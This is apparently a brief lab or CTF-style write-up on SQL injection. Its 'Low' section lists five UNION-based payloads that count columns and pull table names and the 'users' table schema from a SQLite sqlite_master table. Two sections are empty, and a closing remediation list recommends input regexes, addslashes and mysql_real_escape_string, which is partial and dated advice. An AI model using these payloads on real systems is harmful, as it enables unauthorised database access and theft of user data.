# 1. Low
`null'order+by+1--`
`null'order+by+7--`
`null'UNION+SELECT+1,name,null,null,null,null+FROM+sqlite_master--`
`null'UNION+SELECT+1,tbl_name,3,4,5,6+FROM+sqlite_master--`
`null'UNION+SELECT+1,sql,3,4,5,6+FROM+sqlite_master+WHERE+name='users'--`


---
# 2. Medium


---
# 3. Script Supported

---
# 4. Remediation

- Validating User Input and only accept word or number only, example given using regular expression: `\w+` or `[a-zA-Z0-9 .-_]+`
- Using function to filter input: 
	- `$value = mysql_real_escape_string($data);`
	- `$value = addslashes($data);`
- Using [sanitize filter php](https://www.php.net/manual/en/filter.filters.sanitize.php)